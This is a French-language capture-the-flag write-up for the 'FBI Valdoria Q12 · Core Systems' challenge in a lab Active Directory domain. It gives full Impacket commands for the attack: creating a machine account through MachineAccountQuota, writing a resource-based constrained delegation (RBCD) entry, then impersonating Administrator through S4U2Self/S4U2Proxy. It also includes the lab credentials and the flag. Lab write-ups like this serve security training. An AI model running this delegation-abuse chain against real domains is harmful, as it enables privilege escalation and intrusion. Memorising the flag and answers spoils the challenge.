---
title: "FBI Valdoria Q12 · Core Systems"
platform: "HackerLab Benin 2026"
category: "ad"
difficulty: "—"
points: 100
os: "Windows"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/fbi-ad/12-core-systems.md"
tags: [hackerlab-benin-2026, ad]
status: published
---

# FBI Valdoria : Q12 · Core Systems (100 pts)

> *« Le serveur applicatif APP01 fait partie de l'infrastructure critique du FBI Valdoria. »*

## TL;DR

Abus de **MachineAccountQuota** + **RBCD (Resource-Based Constrained Delegation)** sur `APP01$`. Avec les credentials `svc_web`, on crée un compte machine contrôlé puis on écrit la propriété `msDS-AllowedToActOnBehalfOfOtherIdentity` d'APP01 pour l'autoriser à nous usurper.

**Flag** : `HLB2026{RBCD_RESOURCE_DELEGATION_APP01_EXPLOITED}`

## Pré-requis

- `svc_web:W3bSvc!2024@FBI` (depuis `SQL-Delegated` récupéré en Q11).
- `MachineAccountQuota ≥ 1` sur le domaine (par défaut 10).

## 1. Création du compte machine

```bash
addcomputer.py -computer-name 'EVIL01$' \
    -computer-pass 'EvilPass123!' \
    -dc-ip 172.28.X.2 \
    'valdoria.fbi.lab/svc_web:W3bSvc!2024@FBI'
```

## 2. Ajout de l'ACE RBCD

Via LDAP, on écrit `msDS-AllowedToActOnBehalfOfOtherIdentity` sur `APP01$` avec un SDDL qui autorise `EVIL01$` :

```bash
rbcd.py -delegate-from 'EVIL01$' \
        -delegate-to 'APP01$' \
        -dc-ip 172.28.X.2 -action write \
        'valdoria.fbi.lab/svc_web:W3bSvc!2024@FBI'
```

## 3. Validation

Un endpoint de validation sur APP01 confirme l'exploitation :

```bash
curl -u 'svc_web:W3bSvc!2024@FBI' \
     -X POST http://172.28.X.4:8446/verify/rbcd
# {"status":"verified","target":"APP01$"}
```

## 4. Impersonation via S4U2Self + S4U2Proxy

```bash
getST.py -spn cifs/APP01.valdoria.fbi.lab \
    -impersonate Administrator \
    -dc-ip 172.28.X.2 \
    'valdoria.fbi.lab/EVIL01$:EvilPass123!'

export KRB5CCNAME=Administrator@cifs_APP01@VALDORIA.FBI.LAB.ccache
smbclient.py -k -no-pass APP01.valdoria.fbi.lab
```

## Flag

```
HLB2026{RBCD_RESOURCE_DELEGATION_APP01_EXPLOITED}
```
